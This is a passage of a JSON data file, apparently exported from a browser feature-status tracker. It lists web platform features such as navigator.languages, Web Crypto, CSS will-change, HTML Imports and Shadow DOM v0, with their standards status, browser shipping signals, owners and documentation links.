          "url": "https://bugs.webkit.org/show_bug.cgi?id=132588",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "This is a new attribute on the Navigator object.\r\nIt returns the number of tasks that can be run efficiently in parallel on the current system under ideal circumstances.",
    "id": 6248386202173440,
    "resources": {
      "docs": [
        "http://wiki.whatwg.org/wiki/NavigatorCores"
      ],
      "samples": [
        "http://wg.oftn.org/projects/core-estimator/demo/"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2018-04-26 04:54:59.424530",
      "by": "Patket@microsoft.com"
    },
    "name": "NavigatorLanguage: navigator.languages and languagechange event",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://www.whatwg.org/specs/web-apps/current-work/multipage/timers.html#navigatorlanguage",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=889335",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 37
        },
        "owners": [
          "mlamouri@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 37,
        "flag": false,
        "android": 37,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=365123",
        "intervention": false
      },
      "opera": {
        "android": 24,
        "desktop": 24
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "navigator.languages will expose the Accept Languages and languageevent (fired on the Window object) will notify of a change in this value. The goal is to allow web applications to handle i18n on the client side, thus allowing offline applications to react to user language changes.",
    "id": 6056371904577536,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/NavigatorLanguage.languages"
      ]
    }
  },
  {
    "category": "Graphics",
    "updated": {
      "when": "2017-06-14 18:29:12.626760",
      "by": "ericbidelman@google.com"
    },
    "name": "Subpixel font scaling",
    "comments": "Shipping blocked on DirectWrite support (for windows).",
    "standards": {
      "status": {
        "text": "De-facto standard",
        "val": 1
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 37
        },
        "owners": [
          "eae@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 37,
        "ios": 37,
        "blink_components": [
          "Blink"
        ],
        "desktop": 37,
        "flag": false,
        "android": 37,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=164167",
        "intervention": false
      },
      "opera": {
        "android": 24,
        "desktop": 24
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Allow sub-css-pixel font-sizes and thus smooth font scaling.",
    "id": 6259163214643200,
    "resources": {}
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-06-14 18:28:34.897180",
      "by": "ericbidelman@google.com"
    },
    "name": "Web Crypto API",
    "comments": "IE 11 Beta contains a version based on the 21 May 2013 editor's draft ( https://dvcs.w3.org/hg/webcrypto-api/raw-file/tag2013.05.21/spec/Overview.html ) along with incorporating Netflix's Wrap/Unwrap proposal ( http://www.w3.org/2012/webcrypto/wiki/KeyWrap_Proposal ) over the ED-specified mechanism",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://dvcs.w3.org/hg/webcrypto-api/raw-file/tip/spec/Overview.html",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 37
        },
        "owners": [
          "rsleevi@chromium.org",
          "eroman@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 37,
        "flag": false,
        "android": 37,
        "bug": "http://crbug.com/245025",
        "intervention": false
      },
      "opera": {
        "android": 24,
        "desktop": 24
      },
      "edge": {
        "view": {
          "url": "http://msdn.microsoft.com/en-us/library/ie/dn302338(v=vs.85).aspx",
          "text": "In development",
          "val": 2
        }
      },
      "safari": {
        "view": {
          "url": "https://lists.webkit.org/pipermail/webkit-dev/2013-October/025707.html",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Mixed signals",
          "val": 3
        }
      }
    },
    "summary": "JavaScript bindings for cryptographic operations",
    "id": 5030265697075200,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Web_Crypto_API"
      ]
    }
  },
  {
    "category": "User input",
    "updated": {
      "when": "2017-11-06 19:39:53.181550",
      "by": "ericbidelman@google.com"
    },
    "first_of_milestone": true,
    "name": "CSS touch-action",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://dvcs.w3.org/hg/pointerevents/raw-file/tip/pointerEvents.html#the-touch-action-css-property",
      "visibility": {
        "text": "Likely in mainstream tech news",
        "val": 1
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=795567",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 36
        },
        "owners": [
          "rbyers@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>CSS"
        ],
        "desktop": 36,
        "flag": false,
        "android": 36,
        "bug": "http://crbug.com/258459",
        "intervention": false
      },
      "opera": {
        "android": 23,
        "desktop": 23
      },
      "edge": {
        "view": {
          "url": "http://msdn.microsoft.com/en-us/library/windows/apps/hh767313.aspx",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "New CSS property to enable websites to declaratively state how touches should be handled for purposes of scrolling and zooming.",
    "id": 5912074022551552,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/CSS/touch-action"
      ],
      "samples": [
        "http://rbyers.github.io/touch-action.html"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:29:08.850060",
      "by": "ericbidelman@google.com"
    },
    "name": "CSS will-change",
    "comments": "Implemented but disabled by default in Firefox",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://www.w3.org/TR/css-will-change-1/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=940842",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 36
        },
        "owners": [
          "ajuma@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 36,
        "flag": false,
        "android": 36,
        "bug": "http://crbug.com/356186",
        "intervention": false
      },
      "opera": {
        "android": 24,
        "desktop": 24
      },
      "edge": {
        "view": {
          "url": "http://status.modern.ie/csswillchange",
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "safari": {
        "view": {
          "url": "https://developer.apple.com/library/content/releasenotes/General/WhatsNewInSafari/Articles/Safari_9_1.html#//apple_ref/doc/uid/TP40014305-CH10-SW14",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Adds a will-change CSS property, that can be used to signal that a particular property is likely to be changed in the future, or that an element’s content is likely to change.",
    "id": 5954199330226176,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/CSS/will-change",
        "http://dev.opera.com/articles/css-will-change-property/"
      ]
    }
  },
  {
    "category": "Web Components",
    "updated": {
      "when": "2018-06-15 10:18:39.730734",
      "by": "rbyers@chromium.org"
    },
    "name": "HTML Imports",
    "comments": "Updated IE views based on http://status.modern.ie/#/ (\"Under consideration\").\r\n\r\ncrbug.com/504944 - readyState doesn't go to \"complete\" until Chrome 46.",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 1
      },
      "spec": "https://dvcs.w3.org/hg/webcomponents/raw-file/tip/spec/imports/index.html",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://hacks.mozilla.org/2015/06/the-state-of-web-components/",
          "text": "Opposed",
          "val": 7
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 36
        },
        "owners": [
          "morrita@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 36,
        "flag": false,
        "android": 36,
        "bug": "http://crbug.com/240592",
        "intervention": false
      },
      "opera": {
        "android": 23,
        "desktop": 23
      },
      "edge": {
        "view": {
          "url": "http://status.modern.ie/#/",
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "safari": {
        "view": {
          "url": "https://webkit.org/status/#specification-web-components",
          "text": "Opposed",
          "val": 7
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Import HTML documents into other HTML documents.",
    "id": 5144752345317376,
    "resources": {
      "docs": [
        "http://www.html5rocks.com/tutorials/webcomponents/imports/",
        "https://developer.mozilla.org/en-US/docs/Web/Web_Components/HTML_Imports"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:29:14.365290",
      "by": "ericbidelman@google.com"
    },
    "name": "Unprefixed CSS Transforms",
    "comments": "Enabled by default in Chrome 12, unprefixed in Chrome 36.\r\n\r\nIntent: https://groups.google.com/a/chromium.org/forum/#!topic/blink-dev/vjyd8It--3Y",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 1
      },
      "spec": "http://dev.w3.org/csswg/css3-transforms/",
      "visibility": {
        "text": "Likely in mainstream tech news",
        "val": 1
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 36
        },
        "prefixed": false,
        "origintrial": false,
        "ios": 18,
        "blink_components": [
          "Blink"
        ],
        "desktop": 36,
        "flag": false,
        "android": 36,
        "intervention": false
      },
      "opera": {
        "android": 23,
        "desktop": 23
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "Enables changing the position of content in 3D space without disrupting the document's normal flow.",
    "id": 6437640580628480,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/Guide/CSS/Using_CSS_transforms"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-06-14 18:29:18.019000",
      "by": "ericbidelman@google.com"
    },
    "name": "WOFF 2.0 (improved font compression)",
    "comments": "We might have some minor but potentially compatibility breaking changes coming soon => Postponed initial launch (was slated for M35) in order to avoid breaking compatibility.",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://dev.w3.org/webfonts/WOFF2/spec/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1064737",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 36
        },
        "owners": [
          "kenjibaheux@chromium.org",
          "ksakamoto@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 36,
        "ios": 36,
        "blink_components": [
          "Blink"
        ],
        "desktop": 36,
        "flag": false,
        "android": 36,
        "bug": "http://crbug.com/242809",
        "intervention": false
      },
      "opera": {
        "android": 23,
        "desktop": 23
      },
      "edge": {
        "view": {
          "url": "https://dev.windows.com/en-us/microsoft-edge/platform/status/wofffileformat20",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://webkit.org/blog/6643/improved-font-loading/",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "WOFF 2.0 significantly improves font compression. We are seeing average gains of 24% with peaks above 50% in particular for the larger fonts such as those typically used by CJK languages (analysis ran on the whole Google Fonts corpus).\r\n\r\n\r\nM33: switching to Brotli Compression Algorithm (instead of LZMA).\r\nM36: enabled by default.",
    "id": 6718644721549312,
    "resources": {}
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-06-14 18:28:27.690060",
      "by": "ericbidelman@google.com"
    },
    "name": "WeakMap (ES6)",
    "comments": "Turned on by default in WebKit nightly.\r\nIt was implemented behind a flag in Chrome 18, until it was turned on by default.",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://www.ecma-international.org/ecma-262/6.0/#sec-weakmap-objects",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/Firefox/Releases/6#JavaScript",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 36
        },
        "owners": [
          "mstarzinger@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 36,
        "flag": false,
        "android": 36,
        "bug": "http://crbug.com/97642",
        "intervention": false
      },
      "opera": {
        "android": 23,
        "desktop": 23
      },
      "edge": {
        "view": {
          "url": "http://msdn.microsoft.com/en-us/library/ie/dn251546",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://webkit.org/status/#feature-weakmap",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "WeakMaps are key/value maps in which keys are objects.",
    "id": 4572868859920384,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/WeakMap"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-06-14 18:29:09.115700",
      "by": "ericbidelman@google.com"
    },
    "name": "WeakSet (ES6)",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://www.ecma-international.org/ecma-262/6.0/#sec-weakset-objects",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=792439",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 36
        },
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 36,
        "flag": false,
        "intervention": false
      },
      "opera": {
        "android": 23,
        "desktop": 23
      },
      "edge": {
        "view": {
          "url": "https://dev.modern.ie/platform/status/weaksetes6",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://webkit.org/status/#feature-weakset",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "ES6 WeakSets are sets of arbitrary JavaScript objects, that hold on to their keys weakly",
    "id": 5977677567623168,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/WeakSet"
      ]
    }
  },
  {
    "category": "Graphics",
    "updated": {
      "when": "2017-06-14 18:28:32.237780",
      "by": "ericbidelman@google.com"
    },
    "name": "Web Animations JavaScript API [element.animate()] ",
    "comments": "A subset of the API is enabled by default in M36: https://groups.google.com/a/chromium.org/d/msg/blink-dev/SWxBI0uPvUE/iZCNwoN3nKEJ\r\n\r\nThe rest of the API is expected to be shipped in future releases.\r\n\r\nhttp://www.polymer-project.org/platform/web-animations.html",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 1
      },
      "spec": "http://www.w3.org/TR/web-animations/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1245000",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 36
        },
        "owners": [
          "shans@chromium.org",
          "dstockwell@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 36,
        "flag": false,
        "android": 36,
        "intervention": false
      },
      "opera": {
        "android": 23,
        "desktop": 23
      },
      "edge": {
        "view": {
          "url": "http://status.modern.ie/webanimationsjavascriptapi",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "url": "https://lists.webkit.org/pipermail/webkit-dev/2013-October/025758.html",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "A unified model for supporting animation and synchronization on the Web platform. ",
    "id": 4854343836631040,
    "resources": {
      "docs": [
        "http://updates.html5rocks.com/2014/05/Web-Animations---element-animate-is-now-in-Chrome-36"
      ],
      "samples": [
        "https://github.com/GoogleChrome/samples/tree/gh-pages/web-animations"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-10-26 20:03:50.939200",
      "by": "ericbidelman@google.com"
    },
    "first_of_milestone": true,
    "name": "CSS Blending of background images (mix-blend-mode)",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://dev.w3.org/fxtf/compositing/#background-blend-mode",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=970600",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 35
        },
        "owners": [
          "cabanier@adobe.com",
          "rosca@adobe.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>CSS"
        ],
        "desktop": 35,
        "flag": false,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=229166",
        "intervention": false
      },
      "opera": {
        "android": 22,
        "desktop": 22
      },
      "edge": {
        "view": {
          "url": "https://status.modern.ie/backgroundblendmode",
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=128270",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Offers more ways to blend a background image of an element with other background images that are below it and with the element's background color.\r\n\r\n\r\n",
    "id": 5768037999312896,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/CSS/background-blend-mode"
      ],
      "samples": [
        "http://codepen.io/bennettfeely/pen/rxoAc",
        "http://codepen.io/bennettfeely/pen/fAowH",
        "http://codepen.io/bennettfeely/pen/uLKrG",
        "http://bennettfeely.com/gradients/"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:29:12.424040",
      "by": "ericbidelman@google.com"
    },
    "name": "CSS Font Loading",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://dev.w3.org/csswg/css-font-loading-3/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1028497",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 35
        },
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 35,
        "flag": false,
        "android": 35,
        "bug": "http://crbug.com/196457",
        "intervention": false
      },
      "opera": {
        "android": 22,
        "desktop": 22
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=135390",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "A feature that enables applications to know if a web font is really loaded.",
    "id": 6244676289953792,
    "resources": {}
  },
  {
    "category": "Web Components",
    "updated": {
      "when": "2017-10-09 16:29:14.772520",
      "by": "ericbidelman@google.com"
    },
    "name": "Prefixed Shadow DOM",
    "comments": "This old and prefixed implementation is being deprecated, please watch out for deprecation warnings in the devtools console. We have enabled an unprefixed modern Shadow DOM implementation in M35 (see the latest spec and polymer-dev for additional details on what changed since then)\r\n\r\nUpdated IE views based on http://status.modern.ie/#/ (\"Under consideration\").\r\n\r\nLatest spec: see also dev.w3.org/csswg/shadow-styling/ for the styling aspects.",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://w3c.github.io/webcomponents/spec/shadow/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=887538",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Deprecated",
          "val": 6,
          "milestone_str": 35
        },
        "owners": [
          "hayato@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>DOM>ShadowDOM"
        ],
        "desktop": 35,
        "flag": false,
        "bug": "http://crbug.com/145868",
        "intervention": false
      },
      "opera": {
        "android": 22,
        "desktop": 22
      },
      "edge": {
        "view": {
          "url": "http://status.modern.ie/#/",
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "safari": {
        "view": {
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Enables DOM tree encapsulation. Without it, widgets may inadvertently break pages by using conflicting CSS selectors, class or id names, or JavaScript variables.",
    "id": 5479141319114752,
    "resources": {}
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:28:39.905710",
      "by": "ericbidelman@google.com"
    },
    "name": "Scoped Styles",
    "comments": "It was partially implemented behind a flag, but was later retracted due to high code complexity.\r\nhttps://groups.google.com/a/chromium.org/forum/#!searchin/blink-dev/scoped/blink-dev/R1x18ZLS5qQ/Bjuh_cENhlQJ",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://whatwg.org/html#attr-style-scoped",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 35
        },
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 35,
        "flag": false,
        "intervention": false
      },
      "opera": {
        "android": 22,
        "desktop": 22
      },
      "edge": {
        "view": {
          "url": "http://status.modern.ie/scopedstyles",
          "text": "Public skepticism",
          "val": 6
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Boolean attribute for the <style> element (<style scoped>). When present, its styles only apply to the parent element.",
    "id": 5374137958662144,
    "resources": {}
  },
  {
    "category": "Web Components",
    "updated": {
      "when": "2018-04-10 10:28:54.770190",
      "by": "kochi@google.com"
    },
    "name": "Shadow DOM v0",
    "comments": "Enabled in M35. \r\n\r\nThe old prefixed implementation we had since M25 is being deprecated, please watch out for deprecation warnings in the devtools console.\r\n\r\nUpdated IE views based on http://status.modern.ie/#/ (\"Under consideration\").\r\n\r\nLatest spec: see also dev.w3.org/csswg/shadow-styling/ for the styling aspects.",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://dvcs.w3.org/hg/webcomponents/raw-file/tip/spec/shadow/index.html",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=887538",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 35
        },
        "owners": [
          "hayato@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>DOM>ShadowDOM"
        ],
        "desktop": 35,
        "flag": false,
        "android": 35,
        "bug": "http://crbug.com/336121",
        "intervention": false
      },
      "opera": {
        "android": 22,
        "desktop": 22
      },
      "edge": {
        "view": {
          "url": "https://blogs.windows.com/msedgedev/2015/07/15/microsoft-edge-and-web-components/",
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "safari": {
        "view": {
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Chrome and other browsers implemented the new version, see https://www.chromestatus.com/features/4667415417847808.\r\n\r\nV0 is scheduled for deprecation starting in April 2018 and removal in April 2019.\r\nIf you are still using this consider migrating to the new API or upgrading your Polymer library. Use --disable-blink-features=ShadowDOMV0 for testing if your site works without Shadow DOM V0 APIs.\r\n\r\n",
    "id": 4507242028072960,
    "resources": {
      "docs": [
        "http://www.html5rocks.com/en/tutorials/webcomponents/shadowdom/",
        "https://developer.mozilla.org/en-US/docs/Web/Web_Components/Shadow_DOM"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2018-04-25 21:27:29.973300",
      "by": "Patket@microsoft.com"
    },
    "name": "Unprefixed Web Audio API",
    "comments": "Prefixed Web Audio was enabled by default in Chrome 14; the unprefixed version in Chrome 34",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 1
      },
      "spec": "https://dvcs.w3.org/hg/audio/raw-file/tip/webaudio/specification.html",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 35
        },
        "owners": [
          "jtlinden@chromium.org",
          "rtoy@chromium.org"
        ],
        "prefixed": true,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 35,
        "flag": false,
        "android": 35,
        "intervention": false
      },
      "opera": {
        "android": 22,
        "desktop": 22
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "A high-level JavaScript API for processing and synthesizing audio in web applications",
    "id": 6261718720184320,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Web_Audio_API/Using_Web_Audio_API"
      ],
      "samples": [
        "http://webaudiodemos.appspot.com",
        "http://simpl.info/webaudio/"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-06-14 18:28:28.581640",
      "by": "ericbidelman@google.com"
    },
    "first_of_milestone": true,
    "name": "<img srcset>",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://whatwg.org/html#attr-img-srcset",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=870021",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 34
        },
        "owners": [
          "yoav@yoav.ws"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
